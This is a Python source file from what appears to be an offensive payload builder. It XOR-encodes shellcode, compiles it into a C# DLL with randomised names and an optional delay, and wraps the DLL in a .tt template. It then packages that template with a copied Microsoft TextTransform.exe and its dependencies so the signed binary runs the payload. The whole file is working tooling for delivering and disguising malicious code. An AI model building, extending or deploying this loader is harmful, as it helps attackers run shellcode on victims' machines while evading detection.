import os
import re
import shutil
import subprocess
import tempfile
from pathlib import Path

from .config import Config
from .shellcode import ShellcodeParser
from . import csharp, tt


CSC_PATHS = [
    r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
]

BINS_EXE_DIR = Path(__file__).resolve().parents[2] / "bins" / "exe"

TT_RUNTIME_DLLS = [
    ("CommonExtensions/Microsoft/VBCSharp/LanguageServices", "Microsoft.CodeAnalysis.CSharp.dll"),
    ("CommonExtensions/Microsoft/VBCSharp/LanguageServices", "Microsoft.CodeAnalysis.dll"),
    ("PrivateAssemblies", "Microsoft.VisualStudio.RemoteControl.dll"),
    ("PrivateAssemblies", "Microsoft.VisualStudio.Telemetry.dll"),
    ("PublicAssemblies", "Microsoft.VisualStudio.TextTemplating.dll"),
    ("PublicAssemblies", "Microsoft.VisualStudio.TextTemplating.Interfaces.10.0.dll"),
    ("PublicAssemblies", "Microsoft.VisualStudio.TextTemplating.Interfaces.11.0.dll"),
    ("PrivateAssemblies", "Microsoft.VisualStudio.Utilities.Internal.dll"),
    ("PrivateAssemblies/Newtonsoft.Json.13.0.4.0", "Newtonsoft.Json.dll"),
    ("PublicAssemblies", "System.Collections.Immutable.dll"),
    ("TextTransform", "System.CommandLine.dll"),
    ("PublicAssemblies", "System.Memory.dll"),
    ("PublicAssemblies", "System.Numerics.Vectors.dll"),
    ("PublicAssemblies", "System.Reflection.Metadata.dll"),
    ("PublicAssemblies", "System.Runtime.CompilerServices.Unsafe.dll"),
]


def _find_csc():
    for p in CSC_PATHS:
        if os.path.isfile(p):
            return p
    raise FileNotFoundError("csc.exe not found in known .NET Framework paths")


class Builder:
    def __init__(self, config: Config):
        self.config = config
        self.shellcode = ShellcodeParser(config.shellcode)
        if config.assembly_name:
            self.namespace = config.assembly_name
            _, self.classname = csharp.generate_names()
        else:
            self.namespace, self.classname = csharp.generate_names()
        self.assembly_name = self.namespace
        self.tmp_dir = tempfile.mkdtemp(prefix="tts_")
        self.build_dir = Path(config.output_dir) / self.assembly_name

    def run(self):
        try:
            self._read_shellcode()
            self._generate_csharp()
            self._compile()
            self._generate_tt()
            self._package()
            print(f"[+] Run: TextTransform.exe {self.assembly_name}.tt")
        finally:
            self._cleanup()

    def _read_shellcode(self):
        self.shellcode.read()
        self.shellcode.encode()

    def _generate_csharp(self):
        source = csharp.generate(
            namespace=self.namespace,
            classname=self.classname,
            encoded_hex=self.shellcode.encoded_hex_string(),
            xor_key=self.shellcode.xor_key_hex_string(),
            delay=self.config.delay,
            debug=self.config.debug,
        )

        self.cs_path = os.path.join(self.tmp_dir, f"{self.assembly_name}.cs")
        with open(self.cs_path, "w") as f:
            f.write(source)
        print(f"[+] Generated C# source:\t\t\t{self.cs_path}")

    def _compile(self):
        csc = _find_csc()
        dll_path = os.path.join(self.tmp_dir, f"{self.assembly_name}.dll")

        cmd = [
            csc,
            "/nologo",
            "/target:library",
            "/platform:x64",
            "/optimize+",
            "/reference:System.dll",
            f"/out:{dll_path}",
            self.cs_path,
        ]

        print(f"[*] Compiling assembly...")
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[!] Compilation failed (exit code {result.returncode})")
            print(f"[!] stdout:\n{result.stdout}")
            print(f"[!] stderr:\n{result.stderr}")
            raise RuntimeError("C# compilation failed")

        self.dll_path = dll_path
        print(f"[+] Compiled assembly:\t\t\t\t{self.assembly_name}.dll")

    def _generate_tt(self):
        with open(self.dll_path, "rb") as f:
            dll_bytes = f.read()

        content = tt.generate(dll_bytes, self.namespace, self.classname)

        self.tt_path = os.path.join(self.tmp_dir, f"{self.assembly_name}.tt")
        with open(self.tt_path, "w") as f:
            f.write(content)
        print(f"[+] Generated .tt loader:\t\t\t{self.assembly_name}.tt")

    def _package(self):
        self.build_dir.mkdir(parents=True, exist_ok=True)

        shutil.copy2(self.tt_path, self.build_dir / f"{self.assembly_name}.tt")

        tt_exe = BINS_EXE_DIR / "TextTransform.exe"
        tt_config = BINS_EXE_DIR / "TextTransform.exe.config"

        if tt_exe.exists():
            shutil.copy2(tt_exe, self.build_dir / "TextTransform.exe")
            if tt_config.exists():
                self._write_flat_config(tt_config)
            for subdir, dll_name in TT_RUNTIME_DLLS:
                src = BINS_EXE_DIR / subdir / dll_name
                if src.exists():
                    shutil.copy2(src, self.build_dir / dll_name)
            print(f"[+] Packaged TextTransform.exe + {len(TT_RUNTIME_DLLS)} dependencies (flat)")
        else:
            print(f"[!] TextTransform.exe not found at {tt_exe}")

        print(f"[+] Payload packaged to:\t\t\t{self.build_dir}")

    def _write_flat_config(self, original_config):
        with open(original_config, "r") as f:
            cfg = f.read()
        cfg = re.sub(r'(?m)^\s*<probing privatePath="[^"]*"\s*/>\s*\r?\n', '', cfg)
        cfg = re.sub(r'(?m)^\s*<codeBase[^/]*/>\s*\r?\n', '', cfg)
        with open(self.build_dir / "TextTransform.exe.config", "w") as f:
            f.write(cfg)

    def _cleanup(self):
        try:
            shutil.rmtree(self.tmp_dir, ignore_errors=True)
        except Exception:
            pass
